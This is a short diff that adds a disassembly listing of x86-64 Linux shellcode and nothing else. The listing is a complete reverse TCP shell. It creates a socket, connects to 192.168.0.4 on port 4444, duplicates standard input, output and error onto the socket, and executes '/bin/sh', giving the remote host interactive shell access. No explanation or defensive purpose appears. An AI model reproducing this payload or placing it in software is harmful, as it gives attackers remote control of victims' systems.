@@ -1,0 +1,34 @@
+    0x00  6a29           push 0x29                   ; ')' ; 41                                                                                            
+    0x02  58             pop rax                                                                                                                           
+    0x03  99             cdq                                                                                                                               
+    0x04  6a02           push 2                      ; 2                                                                                                   
+    0x06  5f             pop rdi                                                                                                                           
+    0x07  6a01           push 1                      ; 1                                                                                                   
+    0x09  5e             pop rsi                                                                                                                           
+    0x0a  0f05           syscall                                                                                                                           
+    0x0c  4897           xchg rax, rdi                                                                                                                     
+    0x0e  48b90200115c.  movabs rcx, 0x400a8c05c110002                                                                                                     
+    0x18  51             push rcx                                                                                                                          
+    0x19  4889e6         mov rsi, rsp                          
+    0x1c  6a10           push 0x10                   ; 16
+    0x1e  5a             pop rdx
+    0x1f  6a2a           push 0x2a                   ; '*' ; 42
+    0x21  58             pop rax
+    0x22  0f05           syscall
+    0x24  6a03           push 3                      ; 3
+    0x26  5e             pop rsi
+┌─> 0x27  48ffce         dec rsi
+╎   0x2a  6a21           push 0x21                   ; '!' ; 33
+╎   0x2c  58             pop rax
+╎   0x2d  0f05           syscall
+└─< 0x2f  75f6           jne 0x27
+    0x31  6a3b           push 0x3b                   ; ';' ; 59
+    0x33  58             pop rax
+    0x34  99             cdq
+    0x35  48bb2f62696e.  movabs rbx, 0x68732f6e69622f ; '/bin/sh'
+    0x3f  53             push rbx    
+    0x40  4889e7         mov rdi, rsp
+    0x43  52             push rdx    
+    0x44  57             push rdi    
+    0x45  4889e6         mov rsi, rsp
+    0x48  0f05           syscall
